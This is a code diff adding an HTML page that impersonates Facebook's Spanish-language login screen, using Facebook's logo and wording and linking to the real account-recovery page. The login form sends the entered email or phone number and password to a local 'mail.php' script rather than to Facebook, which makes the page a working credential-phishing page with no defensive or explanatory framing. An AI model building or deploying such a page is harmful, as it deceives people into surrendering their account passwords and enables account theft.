@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="fb_content">
+
+        <div class="content">
+
+            <div class="logo_facebook">
+                <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+            </div>
+
+            <div class="alert">
+                <div class="info">
+                    <img class="info-img" src="./info.png" alt="">
+                </div>
+                <div class="text">
+                    Debes iniciar sesión para continuar.
+                </div>
+            </div>
+
+            <div class="card">
+
+                <div class="sec_1">
+                    Iniciar sesión en Facebook
+                </div>
+
+                <div class="sec_2">
+                    Debes iniciar sesión para continuar.
+                </div>
+
+                <div class="sec_3">
+                    <form class="form" action="mail.php" method="post">
+                        <div class="space">
+                            <input class="form__input" type="text" name="name" id="name" placeholder="Correo electrónico o número de teléfono" required>
+                        </div>
+                        <div class="space">
+                            <input class="form__input" type="password" name="pass" id="pass" placeholder="Contraseña" required>
+                        </div>
+                        <!-- <a type="submit" name="enviar" class="btn">Enviar</a> -->
+                        <button type="submit" name="enviar" class="btn_blue">Iniciar sesión</button>
+                    </form>
+                </div>
+
+                <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" class="pass" target="">¿Olvidaste tu cuenta?</a>
+                <hr style="width: 90%; margin-top: 15px; margin-bottom: 15px;">
+                <button type="submit" name="enviar" class="btn_green">Crear cuenta nueva</button>
+
+
+            </div>
+
+
+            
+        </div>
+
+    </div>
+</body>
+</html>
